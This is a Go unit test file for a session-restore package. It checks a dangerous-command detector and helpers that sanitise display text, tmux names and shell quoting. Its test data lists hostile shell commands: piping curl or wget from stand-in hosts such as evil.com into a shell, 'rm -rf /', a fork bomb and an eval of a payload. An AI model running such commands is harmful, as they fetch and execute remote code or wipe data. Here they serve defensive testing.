package restore

import (
	"testing"
)

func TestIsDangerousCommand(t *testing.T) {
	dangerous := []string{
		"$(curl attacker.com | sh)",
		"curl http://evil.com | bash",
		"eval $(decode payload)",
		"rm -rf /",
		"rm -rf ~",
		":(){:|:&};:",
		"cat file | sh",
		"wget http://evil.com/payload | bash",
		"curl http://example.com | sh",
	}

	for _, cmd := range dangerous {
		if !IsDangerousCommand(cmd) {
			t.Errorf("expected dangerous: %q", cmd)
		}
	}

	safe := []string{
		"npm run dev",
		"go test ./...",
		"python manage.py runserver",
		"docker compose up",
		"git status",
		"tail -f /var/log/syslog",
		"vim main.go",
		"psql -U postgres mydb",
		"curl localhost:3000/health",       // curl without pipe is safe
		"wget https://example.com/file.tar", // wget without pipe is safe
		"rm -rf node_modules",               // rm in project dir is safe
	}

	for _, cmd := range safe {
		if IsDangerousCommand(cmd) {
			t.Errorf("expected safe: %q", cmd)
		}
	}
}

func TestSanitizeForDisplay(t *testing.T) {
	tests := []struct {
		input  string
		expect string
	}{
		{"normal command", "normal command"},
		{"has\x00null\x01bytes", "hasnullbytes"},
		{"has\ttab", "has\ttab"},
		{string(make([]byte, 300)), ""}, // all null bytes stripped, result empty
	}

	for _, tt := range tests {
		got := sanitizeForDisplay(tt.input)
		if len(got) > 200 {
			t.Errorf("sanitizeForDisplay should truncate to 200 chars, got %d", len(got))
		}
		// Basic check — no control chars below 32 (except we allow some)
		for _, c := range got {
			if c < 32 && c != '\t' {
				t.Errorf("sanitizeForDisplay left control char %d in output", c)
			}
		}
	}
}

func TestSanitizeTmuxName(t *testing.T) {
	tests := []struct {
		input  string
		expect string
	}{
		{"simple", "simple"},
		{"has:colons", "has-colons"},
		{"has.dots", "has-dots"},
		{"has spaces", "has-spaces"},
		{"", "thaw"},
	}

	for _, tt := range tests {
		got := sanitizeTmuxName(tt.input)
		if got != tt.expect {
			t.Errorf("sanitizeTmuxName(%q) = %q, want %q", tt.input, got, tt.expect)
		}
	}
}

func TestEsc(t *testing.T) {
	tests := []struct {
		input  string
		expect string
	}{
		{"simple", "'simple'"},
		{"", "''"},
		{"has'quote", "'has'\\''quote'"},
	}

	for _, tt := range tests {
		got := esc(tt.input)
		if got != tt.expect {
			t.Errorf("esc(%q) = %q, want %q", tt.input, got, tt.expect)
		}
	}
}
